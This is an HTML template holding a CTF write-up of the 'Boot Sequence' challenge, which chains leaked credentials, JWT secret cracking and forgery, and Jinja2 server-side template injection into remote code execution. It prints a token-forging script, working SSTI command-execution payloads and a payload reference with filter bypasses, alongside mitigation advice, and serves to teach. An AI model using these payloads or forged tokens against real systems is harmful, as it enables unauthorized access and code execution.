@@ -1,0 +1,519 @@
+<!-- templates/article_boot_sequence.html (FIXED VERSION) -->
+{% extends "base.html" %}
+
+{% block title %}Boot Sequence CTF Challenge - Abishek Kumar{% endblock %}
+
+{% block content %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/custom.css') }}">
+
+<!-- Article Header -->
+<div class="max-w-4xl mx-auto">
+    <nav class="mb-8 scroll-reveal">
+        <a href="{{ url_for('articles') }}" class="inline-flex items-center text-blue-600 hover:text-blue-700">
+            <i class="fas fa-arrow-left mr-2"></i>
+            Back to Articles
+        </a>
+    </nav>
+
+    <article class="bg-white rounded-2xl shadow-lg overflow-hidden">
+        <!-- Header Section -->
+        <div class="bg-gradient-to-br from-indigo-500 to-purple-700 p-12 text-white">
+            <div class="flex flex-wrap gap-2 mb-4">
+                <span class="px-3 py-1 bg-white/20 backdrop-blur-sm rounded-full text-sm font-medium">CTF Write-up</span>
+                <span class="px-3 py-1 bg-white/20 backdrop-blur-sm rounded-full text-sm font-medium">SSTI</span>
+                <span class="px-3 py-1 bg-white/20 backdrop-blur-sm rounded-full text-sm font-medium">RCE</span>
+                <span class="px-3 py-1 bg-white/20 backdrop-blur-sm rounded-full text-sm font-medium">JWT</span>
+            </div>
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">Boot Sequence CTF Challenge: From JWT Forgery to SSTI Remote Code Execution</h1>
+            <div class="flex items-center gap-6 text-indigo-100">
+                <span><i class="fas fa-user mr-2"></i>Abishek Kumar</span>
+                <span><i class="fas fa-calendar mr-2"></i>December 14, 2025</span>
+                <span><i class="fas fa-clock mr-2"></i>20 min read</span>
+                <span class="flex items-center"><i class="fas fa-star mr-2 text-yellow-300"></i>CVSS 10.0</span>
+            </div>
+        </div>
+
+        <!-- Content Section -->
+        <div class="p-8 md:p-12 prose prose-lg max-w-none dark:prose-invert">
+            
+            <h2>Introduction</h2>
+            <p>Imagine being tasked with rebooting an orbital relay control system before an entire fleet drifts off-course into the void of space. This was the premise of the "Boot Sequence" CTF challenge from CloudSek Research Team CTF 2025 — a thrilling web exploitation scenario that combined multiple attack vectors into a devastating vulnerability chain.</p>
+            
+            <p>In this write-up, I'll walk you through how I exploited a web application from initial reconnaissance to complete system compromise, demonstrating:</p>
+            <ul>
+                <li>🔍 Information disclosure in client-side JavaScript</li>
+                <li>🔐 JWT secret cracking and token forgery</li>
+                <li>🎭 Privilege escalation through authentication bypass</li>
+                <li>💉 Server-Side Template Injection (SSTI)</li>
+                <li>🚀 Remote Code Execution (RCE) via Jinja2</li>
+            </ul>
+
+            <div class="bg-red-50 border-l-4 border-red-500 p-6 my-8 dark:bg-gray-800 dark:border-red-400">
+                <p class="font-semibold text-red-900 dark:text-red-300 mb-2">🚨 Final CVSS Score: 10.0 (Critical)</p>
+                <p class="text-red-800 dark:text-red-200">This vulnerability chain represents a complete system compromise with maximum impact on confidentiality, integrity, and availability.</p>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Phase 1: Reconnaissance - Finding the Keys</h2>
+            
+            <h3>JavaScript File Enumeration</h3>
+            <p>The first rule of web application testing: <strong>check the client-side code</strong>. I inspected the page source and discovered several JavaScript files:</p>
+            <pre class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg overflow-x-auto"><code>/static/js/secrets.js       ← Suspicious name!
+/static/js/console.js
+/static/js/telemetry.js
+/static/js/hud.js</code></pre>
+
+            <h3>The Credential Goldmine</h3>
+            <p>Accessing <code>/static/js/secrets.js</code> revealed the jackpot:</p>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>// Orbital Access Credentials
+const FLIGHT_CREDENTIALS = {
+    username: "flightoperator",
+    password: "GlowCloud!93",
+    privilege: "operator"  // Not admin - important!
+};
+
+// DO NOT COMMIT TO PRODUCTION
+// TODO: Move to environment variables</code></pre>
+
+            <div class="bg-yellow-50 border-l-4 border-yellow-500 p-6 my-8 dark:bg-gray-800 dark:border-yellow-400">
+                <p class="font-semibold text-yellow-900 dark:text-yellow-300 mb-2">🔍 Critical Finding #1</p>
+                <p class="text-yellow-800 dark:text-yellow-200">Hardcoded credentials exposed in publicly accessible JavaScript. Any visitor to the application can obtain valid authentication credentials without any attack.</p>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Phase 2: Initial Access - Operator Login</h2>
+            
+            <h3>JWT Token Analysis</h3>
+            <p>Decoding the JWT at jwt.io revealed its structure:</p>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>{
+    "sub": "flightoperator",
+    "role": "operator",        ← We need "admin"
+    "iat": 1765693695,
+    "exp": 1765697295
+}</code></pre>
+
+            <p><strong>Key Observation:</strong> The role is set to <code>operator</code>, not <code>admin</code>. This would need to be changed to access privileged functions.</p>
+
+            <hr class="my-12">
+
+            <h2>Phase 3: Discovering the Admin Panel</h2>
+            
+            <h3>Console Manipulation</h3>
+            <p>Using browser DevTools, I noticed elements with classes like <code>hidden</code> and <code>admin-locked</code>:</p>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>// Find locked admin elements
+document.querySelectorAll('.admin-locked').forEach(el =&gt; {
+    el.classList.remove('hidden');
+    el.classList.remove('admin-locked');
+});</code></pre>
+
+            <p>This revealed the <strong>Quantum Admin Beacon</strong> interface!</p>
+
+            <div class="bg-gray-100 p-6 rounded-lg my-6 dark:bg-gray-800">
+                <p class="font-semibold mb-2 dark:text-white">Testing the Admin Endpoint:</p>
+                <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>POST /api/admin/hyperpulse HTTP/1.1
+Authorization: Bearer eyJhbGci...
+
+{
+    "message": "test",
+    "checksum": "computed_value"
+}
+
+Response:
+{
+    "error": "Access denied. Admin role required."
+}</code></pre>
+            </div>
+
+            <p><strong>Access denied.</strong> I needed to escalate my privileges.</p>
+
+            <hr class="my-12">
+
+            <h2>Phase 4: JWT Forgery - Becoming Admin</h2>
+            
+            <h3>Cracking the JWT Secret</h3>
+            <p>I used <code>jwt_tool</code> with the classic <code>rockyou.txt</code> wordlist:</p>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>python3 jwt_tool.py &lt;OPERATOR_JWT_TOKEN&gt; -C -d /usr/share/wordlists/rockyou.txt
+
+[+] Testing known common secrets...
+[+] butterfly loaded from list
+
+[+] Secret key: butterfly</code></pre>
+
+            <p class="text-xl font-bold text-red-600 dark:text-red-400">Success! The JWT secret was the incredibly weak password: "butterfly"</p>
+
+            <h3>Forging the Admin Token</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>import jwt
+import time
+
+# The cracked secret
+SECRET_KEY = "butterfly"
+
+# Forge admin payload
+payload = {
+    "sub": "root",
+    "role": "admin",            # Admin role!
+    "iat": int(time.time()),
+    "exp": int(time.time()) + 3600
+}
+
+# Generate forged token
+forged_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")</code></pre>
+
+            <h3>Token Injection</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>// Store the forged admin token
+sessionStorage.setItem('orbitalToken', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
+
+// Reload to apply new privileges
+location.reload();</code></pre>
+
+            <div class="bg-green-50 border-l-4 border-green-500 p-6 my-8 dark:bg-gray-800 dark:border-green-400">
+                <p class="font-semibold text-green-900 dark:text-green-300 mb-2">✅ Success!</p>
+                <p class="text-green-800 dark:text-green-200">The interface transformed! I now had access to the Quantum Admin Beacon with full administrative privileges.</p>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Phase 6: SSTI Discovery - Breaking the Template</h2>
+            
+            <h3>Testing for Template Injection</h3>
+            <p>Server-Side Template Injection (SSTI) occurs when user input is embedded into template engines without proper sanitization. I tested basic SSTI payloads:</p>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>const payload = "&#123;&#123;7*7&#125;&#125;";
+const checksum = window.hyperpulseChecksum(payload, token);
+
+fetch('/api/admin/hyperpulse', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${token}`
+    },
+    body: JSON.stringify({
+        message: payload,
+        checksum: checksum
+    })
+});</code></pre>
+
+            <div class="bg-blue-50 border-l-4 border-blue-500 p-6 my-8 dark:bg-gray-800 dark:border-blue-400">
+                <p class="font-semibold text-blue-900 dark:text-blue-300 mb-2">Response:</p>
+                <pre class="text-blue-800 dark:text-blue-200"><code>{ "result": "49" }  // 7*7 was evaluated!</code></pre>
+                <p class="text-xl font-bold text-blue-900 dark:text-blue-300 mt-4">🎯 SSTI CONFIRMED!</p>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Phase 7: SSTI Exploitation - From Injection to RCE</h2>
+            
+            <h3>Understanding Jinja2 SSTI</h3>
+            <p>Jinja2 template injection can lead to Remote Code Execution through Python's object introspection. The attack chain:</p>
+            <ol>
+                <li>Access built-in objects via <code>__globals__</code></li>
+                <li>Import dangerous modules like <code>os</code></li>
+                <li>Execute arbitrary system commands</li>
+            </ol>
+
+            <h3>Environment Exploration</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>// List Current Directory
+&#123;&#123;lipsum.__globals__.os.popen('ls -la').read()&#125;&#125;
+
+// Check Current User
+&#123;&#123;lipsum.__globals__.os.popen('whoami').read()&#125;&#125;
+
+// Search for Flag Files
+&#123;&#123;lipsum.__globals__.os.popen('find / -name *flag* 2&gt;/dev/null').read()&#125;&#125;</code></pre>
+
+            <div class="bg-gray-100 p-6 rounded-lg my-6 dark:bg-gray-800">
+                <p class="font-semibold mb-2 dark:text-white">Key files discovered:</p>
+                <ul class="list-disc pl-6 dark:text-gray-300">
+                    <li><code>/tmp/flag.txt</code> - Potential flag file</li>
+                    <li><code>/tmp/flag.py</code> - Python script (interesting!)</li>
+                </ul>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Phase 8: Examining Flag Files</h2>
+            
+            <h3>Reading flag.txt</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>&#123;&#123;lipsum.__globals__.os.popen('cat /tmp/flag.txt').read()&#125;&#125;
+
+Response:
+This is not the flag you're looking for.
+Try executing flag.py instead!</code></pre>
+
+            <p>A red herring! The real flag requires executing <code>flag.py</code>.</p>
+
+            <h3>Analyzing flag.py</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>#!/usr/bin/env python3
+import os
+
+def get_root_flag():
+    flag_key = os.environ.get('FLAG_KEY', 'default')
+    
+    if os.getuid() == 0:
+        return "ClOuDsEk_ReSeArCH_tEaM_CTF_2025{REAL_FLAG_HERE}"
+    else:
+        return decrypt_flag(flag_key)
+
+def decrypt_flag(key):
+    encrypted = "Q2xPdURzRWtfUmVTZUFyQ0hfdEVhTV9DVEZfMjAyNXs5OTdjNGY0Nzk2MWI0M2NlYWYzMjdlMDhiYzQ1YWQwYn0="
+    import base64
+    return base64.b64decode(encrypted).decode()
+
+if __name__ == '__main__':
+    print(get_root_flag())</code></pre>
+
+            <hr class="my-12">
+
+            <h2>Phase 9: Flag Retrieval - The Final Strike</h2>
+            
+            <h3>Executing flag.py</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>&#123;&#123;lipsum.__globals__.os.popen('python3 /tmp/flag.py').read()&#125;&#125;</code></pre>
+
+            <div class="bg-green-50 border-l-4 border-green-500 p-8 my-8 text-center dark:bg-gray-800 dark:border-green-400">
+                <p class="text-3xl font-bold text-green-900 mb-4 dark:text-green-300">🎉 FLAG CAPTURED!</p>
+                <p class="text-xl font-mono bg-white p-4 rounded-lg text-gray-800 dark:bg-gray-900 dark:text-green-400">ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}</p>
+            </div>
+
+            <p class="text-center text-lg font-semibold">Mission accomplished! The orbital relay is under my control.</p>
+
+            <hr class="my-12">
+
+            <h2>Vulnerability Analysis</h2>
+            
+            <h3>Complete Attack Chain</h3>
+            <pre class="bg-gray-100 p-6 rounded-lg dark:bg-gray-800"><code>1. Information Disclosure (secrets.js)
+         ↓
+2. Weak JWT Secret ("butterfly")
+         ↓
+3. JWT Forgery (role: operator → admin)
+         ↓
+4. Insufficient Access Control
+         ↓
+5. Server-Side Template Injection (Jinja2)
+         ↓
+6. Remote Code Execution
+         ↓
+     FLAG RETRIEVED</code></pre>
+
+            <h3>CVSS Breakdown</h3>
+            <table class="w-full border-collapse border border-gray-300 my-6">
+                <thead class="bg-gray-100 dark:bg-gray-700">
+                    <tr>
+                        <th class="border border-gray-300 p-2">Vulnerability</th>
+                        <th class="border border-gray-300 p-2">CWE</th>
+                        <th class="border border-gray-300 p-2">CVSS Score</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="border border-gray-300 p-2">Information Disclosure</td>
+                        <td class="border border-gray-300 p-2">CWE-200</td>
+                        <td class="border border-gray-300 p-2 text-orange-600">7.5 (High)</td>
+                    </tr>
+                    <tr>
+                        <td class="border border-gray-300 p-2">Weak JWT Secret</td>
+                        <td class="border border-gray-300 p-2">CWE-326</td>
+                        <td class="border border-gray-300 p-2 text-red-600 font-bold">9.1 (Critical)</td>
+                    </tr>
+                    <tr>
+                        <td class="border border-gray-300 p-2">Insufficient Access Control</td>
+                        <td class="border border-gray-300 p-2">CWE-284</td>
+                        <td class="border border-gray-300 p-2 text-orange-600">8.8 (High)</td>
+                    </tr>
+                    <tr>
+                        <td class="border border-gray-300 p-2">Server-Side Template Injection</td>
+                        <td class="border border-gray-300 p-2">CWE-94</td>
+                        <td class="border border-gray-300 p-2 text-red-600 font-bold">9.1 (Critical)</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="bg-red-50 border-l-4 border-red-500 p-6 my-8 dark:bg-gray-800 dark:border-red-400">
+                <p class="font-semibold text-red-900 mb-2 dark:text-red-300">Overall CVSS Score</p>
+                <p class="text-2xl font-bold text-red-600 mb-2">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</p>
+                <p class="text-3xl font-bold text-red-900 dark:text-red-300">Score: 10.0 (Critical)</p>
+                <p class="text-red-800 mt-4 dark:text-red-200">
+                    <strong>Justification:</strong> Network-accessible, low attack complexity, no privileges required initially, 
+                    no user interaction, changed scope, and high impact on confidentiality, integrity, and availability.
+                </p>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Defense Strategies</h2>
+            
+            <h3>Immediate Mitigations</h3>
+            
+            <div class="grid md:grid-cols-2 gap-6 my-6">
+                <div class="bg-red-50 p-6 rounded-lg dark:bg-gray-800">
+                    <p class="font-semibold text-red-900 mb-3 dark:text-red-300">❌ Vulnerable Code</p>
+                    <pre class="text-sm"><code>// Hardcoded credentials
+const password = "GlowCloud!93";
+
+// Weak JWT secret
+SECRET_KEY = "butterfly"
+
+// Unsafe templating
+render_template_string(f"&#123;&#123;&#123;user_input&#125;&#125;&#125;")</code></pre>
+                </div>
+                <div class="bg-green-50 p-6 rounded-lg dark:bg-gray-800">
+                    <p class="font-semibold text-green-900 mb-3 dark:text-green-300">✅ Secure Code</p>
+                    <pre class="text-sm"><code>// Use OAuth/OIDC flows
+// No client-side credentials
+
+// Strong secret
+SECRET_KEY = secrets.token_urlsafe(32)
+
+// Predefined templates
+render_template('response.html', data=escape(input))</code></pre>
+                </div>
+            </div>
+
+            <h3>Key Prevention Measures</h3>
+            <ul>
+                <li>✅ Never use <code>render_template_string()</code> with user input</li>
+                <li>✅ Generate strong JWT secrets (256+ bits)</li>
+                <li>✅ Implement server-side role validation</li>
+                <li>✅ Remove development files from production</li>
+                <li>✅ Apply principle of least privilege</li>
+                <li>✅ Monitor for suspicious patterns in logs</li>
+            </ul>
+
+            <hr class="my-12">
+
+            <h2>Advanced SSTI Payloads Reference</h2>
+            
+            <div class="bg-gray-100 p-6 rounded-lg my-6 dark:bg-gray-800">
+                <h4 class="font-bold mb-3 dark:text-white">Detection Payloads</h4>
+                <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>&#123;&#123;7*7&#125;&#125;              # Returns: 49
+&#123;&#123;7*'7'&#125;&#125;            # Returns: 7777777
+&#123;&#123;'foo'*3&#125;&#125;          # Returns: foofoofoo</code></pre>
+            </div>
+
+            <div class="bg-gray-100 p-6 rounded-lg my-6 dark:bg-gray-800">
+                <h4 class="font-bold mb-3 dark:text-white">Remote Code Execution</h4>
+                <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>&#123;&#123;lipsum.__globals__.os.popen('whoami').read()&#125;&#125;
+&#123;&#123;lipsum.__globals__.os.popen('id').read()&#125;&#125;
+&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code></pre>
+            </div>
+
+            <div class="bg-gray-100 p-6 rounded-lg my-6 dark:bg-gray-800">
+                <h4 class="font-bold mb-3 dark:text-white">Bypassing Filters</h4>
+                <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code># If "os" is filtered
+&#123;&#123;lipsum.__globals__['o'+'s'].popen('id').read()&#125;&#125;
+
+# If "__" is filtered
+&#123;&#123;request['application']['__globals__']['__builtins__']&#125;&#125;</code></pre>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Conclusion</h2>
+            
+            <p>The Boot Sequence challenge demonstrated how a chain of seemingly minor vulnerabilities can lead to complete system compromise. From hardcoded credentials to JWT forgery, and ultimately to remote code execution via SSTI, each step built upon the previous one.</p>
+
+            <h3>Key Achievements</h3>
+            <div class="grid md:grid-cols-2 gap-4 my-6">
+                <div class="flex items-center gap-3 p-4 bg-green-50 rounded-lg dark:bg-gray-800">
+                    <i class="fas fa-check-circle text-green-600 text-2xl"></i>
+                    <span class="font-semibold dark:text-white">Information Disclosure</span>
+                </div>
+                <div class="flex items-center gap-3 p-4 bg-green-50 rounded-lg dark:bg-gray-800">
+                    <i class="fas fa-check-circle text-green-600 text-2xl"></i>
+                    <span class="font-semibold dark:text-white">Authentication Bypass</span>
+                </div>
+                <div class="flex items-center gap-3 p-4 bg-green-50 rounded-lg dark:bg-gray-800">
+                    <i class="fas fa-check-circle text-green-600 text-2xl"></i>
+                    <span class="font-semibold dark:text-white">Privilege Escalation</span>
+                </div>
+                <div class="flex items-center gap-3 p-4 bg-green-50 rounded-lg dark:bg-gray-800">
+                    <i class="fas fa-check-circle text-green-600 text-2xl"></i>
+                    <span class="font-semibold dark:text-white">SSTI Detection</span>
+                </div>
+                <div class="flex items-center gap-3 p-4 bg-green-50 rounded-lg dark:bg-gray-800">
+                    <i class="fas fa-check-circle text-green-600 text-2xl"></i>
+                    <span class="font-semibold dark:text-white">Remote Code Execution</span>
+                </div>
+                <div class="flex items-center gap-3 p-4 bg-green-50 rounded-lg dark:bg-gray-800">
+                    <i class="fas fa-check-circle text-green-600 text-2xl"></i>
+                    <span class="font-semibold dark:text-white">Flag Retrieval</span>
+                </div>
+            </div>
+
+            <div class="bg-blue-50 border-l-4 border-blue-500 p-6 my-8 dark:bg-gray-800 dark:border-blue-400">
+                <p class="font-semibold text-blue-900 dark:text-blue-300 mb-2">💭 Final Thoughts</p>
+                <p class="text-blue-800 dark:text-blue-200">
+                    Security is not about preventing single vulnerabilities—it's about building resilient systems that can withstand 
+                    chains of attacks. This challenge perfectly illustrates why defense in depth is crucial: one vulnerable endpoint 
+                    (hardcoded credentials) gave initial access, one weak secret (JWT key) enabled privilege escalation, and one 
+                    injection flaw (SSTI) led to complete compromise.
+                </p>
+            </div>
+
+            <h3>Resources</h3>
+            <ul>
+                <li><a href="https://portswigger.net/burp" class="text-blue-600 hover:text-blue-700">Burp Suite</a></li>
+                <li><a href="https://github.com/ticarpi/jwt_tool" class="text-blue-600 hover:text-blue-700">jwt_tool - JWT Analysis & Cracking</a></li>
+                <li><a href="https://owasp.org/www-project-top-ten/" class="text-blue-600 hover:text-blue-700">OWASP Top 10</a></li>
+                <li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" class="text-blue-600 hover:text-blue-700">HackTricks - SSTI Guide</a></li>
+            </ul>
+
+        </div>
+
+        <!-- Author Info -->
+        <div class="bg-gray-50 p-8 border-t dark:bg-gray-800">
+            <div class="flex items-center gap-4">
+                 <div class="relative w-16 h-16 rounded-full overflow-hidden bg-white">
+                    <!-- Gradient fallback (shown while image loads) -->
+                    <div class="absolute inset-0 flex items-center justify-center bg-gradient-to-br from-blue-600 to-purple-600 text-white font-bold text-xl">
+                        AK
+                    </div>
+
+                    <!-- Profile image -->
+                    <img
+                        src="{{ url_for('static', filename='images/Abishek.jpeg') }}"
+                        alt="Abishek Kumar"
+                        class="absolute inset-0 w-full h-full object-cover"
+                    />
+                </div>
+                <div>
+                    <h3 class="font-bold text-lg dark:text-white">Abishek Kumar</h3>
+                    <p class="text-gray-600 dark:text-gray-300">Cybersecurity Researcher | Web Developer</p>
+                    <div class="flex gap-4 mt-2">
+                        <a href="https://www.linkedin.com/in/abishek--kumar/" class="text-blue-600 hover:text-blue-700">
+                            <i class="fab fa-linkedin"></i> LinkedIn
+                        </a>
+                        <a href="https://github.com/Abishek-Kumar-GHub" class="text-blue-600 hover:text-blue-700">
+                            <i class="fab fa-github"></i> GitHub
+                        </a>
+                        <a href="https://medium.com/@abishektechy" class="text-blue-600 hover:text-blue-700">
+                            <i class="fab fa-medium"></i> Medium
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <!-- Related Articles -->
+    <div class="mt-8 mb-12">
+        <h3 class="text-2xl font-bold text-gray-800 mb-4 dark:text-white">Related Articles</h3>
+        <div class="bg-white rounded-xl p-6 shadow-lg hover:shadow-xl transition-all">
+            <a href="{{ url_for('article_ctf_round2') }}" class="block">
+                <div class="flex items-center gap-4">
+                    <div class="w-16 h-16 bg-gradient-to-br from-blue-500 to-purple-600 rounded-lg flex items-center justify-center text-white">
+                        <i class="fas fa-shield-alt text-2xl"></i>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-lg text-gray-800 dark:text-white">CloudSek Hiring CTF - Round 2</h4>
+                        <p class="text-gray-600 text-sm dark:text-gray-300">XXE, Type Confusion, JWT Forgery, and Mobile Security</p>
+                    </div>
+                    <i class="fas fa-arrow-right ml-auto text-blue-600"></i>
+                </div>
+            </a>
+        </div>
+    </div>
+</div>
+
+{% endblock %}
